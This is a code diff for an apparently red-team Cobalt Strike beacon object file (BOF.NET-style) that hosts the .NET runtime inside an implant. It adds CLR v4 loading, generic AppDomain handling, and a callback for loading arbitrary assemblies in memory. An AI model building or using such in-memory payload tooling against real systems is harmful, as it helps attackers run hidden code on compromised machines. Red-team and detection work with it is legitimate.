@@ -11,9 +11,13 @@ extern "C"{
 #include <mscoree.h>
 #include <initializer_list>
 
+#include "metahost.h"
+
+
 namespace mscorlib{
     #include "mscorlib.h"
 }
+
 
 __CRT_UUID_DECL(mscorlib::_AppDomain, 0x05F696DC, 0x2B29, 0x3663, 0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13);
 
@@ -22,7 +26,14 @@ const VARIANT vtNull{ {{VT_NULL, 0, 0, 0, {0}}}};
 
 #define MAX_BOF_NAME 512
 
-mscorlib::_AppDomain* initBofNetDomain(ICorRuntimeHost* icrh){
+typedef HRESULT WINAPI (*CLRCreateInstancePtr)(REFCLSID clsid, REFIID riid, LPVOID *ppInterface);
+
+//Bug in Cobalt Strike's inline-execute engine.
+//Doens't seem to resolve variables within .bss section (uninitialsed data/initialised to zero).
+//So we force the variable inside the .data section instead
+__attribute__((section(".data")))  ICorRuntimeHost* icrh = nullptr;
+
+mscorlib::_AppDomain* initAppDomain(ICorRuntimeHost* icrh, const wchar_t* appDomainName){
 
     BOF_LOCAL(OLE32, CLSIDFromString);
 
@@ -32,17 +43,17 @@ mscorlib::_AppDomain* initBofNetDomain(ICorRuntimeHost* icrh){
     mscorlib::_AppDomain* appDomain = nullptr;
     CLSIDFromString(L"{05F696DC-2B29-3663-AD8B-C4389CF2A713}", &CLSID_AppDomain);
 
-    hr = icrh->CreateDomain(L"BOFNET", nullptr, &iu);
+    hr = icrh->CreateDomain(appDomainName, nullptr, &iu);
 
     if(iu == nullptr){
-        log("[!] Failed to create BOFNET AppDomain: 0x%x", hr);
+        log("[!] Failed to create AppDomain: 0x%x", hr);
         return nullptr;
     }
 
     hr = iu->QueryInterface(CLSID_AppDomain, (LPVOID*)&appDomain);
 
     if(appDomain == nullptr){
-        log("[!] Failed to query BOFNET AppDomain interface: 0x%x", hr);
+        log("[!] Failed to query AppDomain interface: 0x%x", hr);
     }
     iu->Release();
 
@@ -50,7 +61,7 @@ mscorlib::_AppDomain* initBofNetDomain(ICorRuntimeHost* icrh){
 }
 
 
-mscorlib::_AppDomain* getBofNetDomain(ICorRuntimeHost* icrh){
+mscorlib::_AppDomain* getAppDomain(ICorRuntimeHost* icrh, const wchar_t* appDomainName){
 
     BOF_LOCAL(msvcrt, wcscmp);
     BOF_LOCAL(OLE32, CLSIDFromString);
@@ -71,7 +82,7 @@ mscorlib::_AppDomain* getBofNetDomain(ICorRuntimeHost* icrh){
         hr = iu->QueryInterface(CLSID_AppDomain, (LPVOID*)&appDomain);
         hr = appDomain->get_FriendlyName(&friendlyName);
 
-        if(friendlyName && wcscmp(friendlyName, L"BOFNET") == 0){
+        if(friendlyName && wcscmp(friendlyName, appDomainName) == 0){
             found = true;
             iu->Release();
             break;
@@ -83,7 +94,7 @@ mscorlib::_AppDomain* getBofNetDomain(ICorRuntimeHost* icrh){
     hr = icrh->CloseEnum(hDomainEnum);
 
     if(!found){
-        appDomain = initBofNetDomain(icrh);
+        appDomain = initAppDomain(icrh, appDomainName);
     }
 
     return appDomain;
@@ -172,6 +183,23 @@ void logConsole(char* msg, int len){
 #endif
 }
 
+mscorlib::_AppDomain* loadAssemblyInAppDomain(const wchar_t* appDomainName, const char* assemblyData, int len){
+
+    mscorlib::_AppDomain* appDomain = getAppDomain(icrh, appDomainName);
+
+    if(appDomain != nullptr){
+        mscorlib::_Assembly* assembly = loadAssembly(appDomain, assemblyData, len);
+        if(assembly != nullptr){
+            return appDomain;
+        }else{
+            appDomain->Release();
+        }
+    }
+
+    return nullptr;
+}
+
+
 const char* skipWhitespace(const char* str){
 
     const char* result = str;
@@ -201,22 +229,75 @@ VARIANT createVariantString(const char* str){
     return result;
 }
 
+ICorRuntimeHost* loadCLR(bool v4){
+
+    BOF_LOCAL(OLE32, CoInitializeEx);
+    BOF_LOCAL(OLE32, CoCreateInstance);
+    BOF_LOCAL(OLE32, CLSIDFromString);
+    BOF_LOCAL(KERNEL32, LoadLibraryA);
+
+    GUID                    IID_RTH, CLSID_RTH, IID_MH, CLSID_MH, CLSID_RH, IID_RH, IID_RHI;
+    HRESULT                 hr;
+    ICorRuntimeHost*        result = nullptr;
+    ICLRMetaHost*           pMetaHost = nullptr;
+    ICLRRuntimeInfo*        pRuntimeInfo = nullptr;
+    ICLRRuntimeHost*        pClrRuntimeHost = nullptr;
+    CLRCreateInstancePtr    pCLRCreateInstance = nullptr;
+    HMODULE                 hMod = NULL;
+
+    CLSIDFromString(L"{cb2f6722-ab3a-11d2-9c40-00c04fa30a3e}", &IID_RTH);
+    CLSIDFromString(L"{cb2f6723-ab3a-11d2-9c40-00c04fa30a3e}", &CLSID_RTH);
+    CLSIDFromString(L"{d332db9e-b9b3-4125-8207-a14884f53216}", &IID_MH);
+    CLSIDFromString(L"{9280188D-0E8E-4867-B30C-7FA83884E8DE}", &CLSID_MH);
+    CLSIDFromString(L"{bd39d1d2-ba2f-486a-89b0-b4b0cb466891}", &IID_RHI);
+    CLSIDFromString(L"{90f1a06e-7712-4762-86b5-7a5eba6bdb02}", &CLSID_RH);
+    CLSIDFromString(L"{90f1a06c-7712-4762-86b5-7a5eba6bdb02}", &IID_RH);
+
+    if( (hMod = LoadLibraryA("mscoree.dll")) != NULL){
+        pCLRCreateInstance = (CLRCreateInstancePtr)GetProcAddress(hMod,"CLRCreateInstance");
+        if(pCLRCreateInstance == nullptr){
+            log("[=]Failed to get v2 ICorRuntimeHost: 0x%x, will try .NET 2 method", hr);
+            v4 = false;
+        }
+    }
+
+    hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
+
+    if(v4 && (hr = pCLRCreateInstance(CLSID_MH, IID_MH, (LPVOID*)&pMetaHost) == S_OK)){
+
+        if((hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_RHI, (LPVOID*)&pRuntimeInfo)) == S_OK){
+            if((hr = pRuntimeInfo->GetInterface(CLSID_RH, IID_RH, (LPVOID*)&pClrRuntimeHost)) == S_OK){;
+                hr = pClrRuntimeHost->Start();
+                hr = pRuntimeInfo->GetInterface(CLSID_RTH, IID_RTH, (LPVOID *)&result);
+            }else{
+                log("Failed to get CLR runtime host: 0x%x", hr);
+            }
+        }else{
+            log("Failed to get v4 runtime info: 0x%x", hr);
+        }
+
+    }else{
+        if( (hr = CoCreateInstance(CLSID_RTH, nullptr, CLSCTX_ALL, IID_RTH,(LPVOID*)&result)) == S_OK){
+            hr = result->Start();
+        }else{
+            log("Failed to get v2 ICorRuntimeHost: 0x%x", hr);
+        }
+    }
+
+    return result;
+}
+
 
 extern "C" void go(char* args , int len) {
 
     BOF_LOCAL(msvcrt, strcmp);
     BOF_LOCAL(msvcrt, memcpy);
     BOF_LOCAL(msvcrt, strlen);
-    BOF_LOCAL(OLE32, CoInitializeEx);
-    BOF_LOCAL(OLE32, CoCreateInstance);
-    BOF_LOCAL(OLE32, CLSIDFromString);
     BOF_LOCAL(OleAut32, SysAllocString);
     BOF_LOCAL(OleAut32, SafeArrayCreate);
     BOF_LOCAL(OleAut32, SafeArrayDestroy);
 
-    GUID                    IID_RTH, CLSID_RTH;
     HRESULT                 hr;
-    ICorRuntimeHost*        icrh = nullptr;
     mscorlib::_Assembly*    bofnetAssembly = nullptr;
     mscorlib::_Type*        bofnetInitalizerType = nullptr;
     char                    bofName[MAX_BOF_NAME];
@@ -228,14 +309,12 @@ extern "C" void go(char* args , int len) {
 
     msvcrt$sscanf_s(args, "%s", bofName, sizeof(bofName));
 
-    CLSIDFromString(L"{cb2f6722-ab3a-11d2-9c40-00c04fa30a3e}", &IID_RTH);
-    CLSIDFromString(L"{cb2f6723-ab3a-11d2-9c40-00c04fa30a3e}", &CLSID_RTH);
+    icrh = loadCLR(true);
+    if(icrh == nullptr){
+        return;
+    }
 
-    hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
-    hr = CoCreateInstance(CLSID_RTH, nullptr, CLSCTX_ALL, IID_RTH,(LPVOID*)&icrh);
-    hr = icrh->Start();
-
-    mscorlib::_AppDomain* bofnetAppDomain = getBofNetDomain(icrh);
+    mscorlib::_AppDomain* bofnetAppDomain = getAppDomain(icrh, L"BOFNET");
 
     if(bofnetAppDomain == nullptr){
         log("[!] Failed to get BOFNET app domain\n", 0);
@@ -288,9 +367,13 @@ extern "C" void go(char* args , int len) {
         return;
     }
 
-    VARIANT callback;
-    callback.vt = VT_I8;
-    callback.llVal = reinterpret_cast<long long>(logConsole);
+    VARIANT logCallback;
+    logCallback.vt = VT_I8;
+    logCallback.llVal = reinterpret_cast<long long>(logConsole);
+
+    VARIANT loadAssemblyCallback;
+    loadAssemblyCallback.vt = VT_I8;
+    loadAssemblyCallback.llVal = reinterpret_cast<long long>(loadAssemblyInAppDomain);
 
     VARIANT vBofName = createVariantString(bofName);
     int bofNameLen = strlen(bofName) + 1;
@@ -308,7 +391,7 @@ extern "C" void go(char* args , int len) {
             cmdLine.bstrVal = nullptr;
         }
 
-        invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 3, &callback, &vBofName, &cmdLine);
+        invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 4, &logCallback, &loadAssemblyCallback, &vBofName, &cmdLine);
 
     }else{
 
@@ -321,7 +404,7 @@ extern "C" void go(char* args , int len) {
         rawData.parray = SafeArrayCreate(VT_UI1, 1, &sab);
         memcpy(rawData.parray->pvData, args+bofNameLen, sab.cElements);
 
-        invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 3, &callback, &vBofName, &rawData);
+        invokeStaticMethod(bofnetInitalizerType, SysAllocString(L"InvokeBof"), 4, &logCallback, &loadAssemblyCallback, &vBofName, &rawData);
 
         SafeArrayDestroy(rawData.parray);
     }
